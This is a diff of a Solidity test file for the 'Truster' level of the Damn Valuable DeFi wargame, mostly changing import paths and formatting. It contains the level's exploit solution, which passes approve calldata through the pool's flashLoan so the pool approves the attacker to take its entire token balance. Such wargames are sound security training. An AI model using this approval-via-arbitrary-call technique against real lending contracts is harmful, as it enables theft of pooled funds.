@@ -4,11 +4,10 @@ pragma solidity 0.8.10;
 import {Utilities} from "../utils/Utilities.sol";
 import {BaseTest} from "../BaseTest.sol";
 
-import "../../DamnValuableToken.sol";
-import "../../truster/TrusterLenderPool.sol";
+import "../../src/DamnValuableToken.sol";
+import "../../src/truster/TrusterLenderPool.sol";
 
 contract TrusterTest is BaseTest {
-
     // Pool has 1000000 ETH in balance
     uint TOKENS_IN_POOL = 1000000 ether;
 
@@ -35,14 +34,12 @@ contract TrusterTest is BaseTest {
         pool = new TrusterLenderPool(address(token));
         vm.label(address(pool), "TrusterLenderPool");
 
-
         token.transfer(address(pool), TOKENS_IN_POOL);
 
         assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
         assertEq(token.balanceOf(attacker), 0);
     }
 
-    
     function test_Exploit() public {
         runTest();
     }
@@ -55,7 +52,11 @@ contract TrusterTest is BaseTest {
         // Act as the attacker
         vm.prank(attacker);
         // make the pool approve the attacker to manage the whole pool balance while taking a free loan
-        bytes memory attackCallData = abi.encodeWithSignature("approve(address,uint256)", attacker, poolBalance);
+        bytes memory attackCallData = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            attacker,
+            poolBalance
+        );
         pool.flashLoan(0, attacker, address(token), attackCallData);
 
         // now steal all the funds
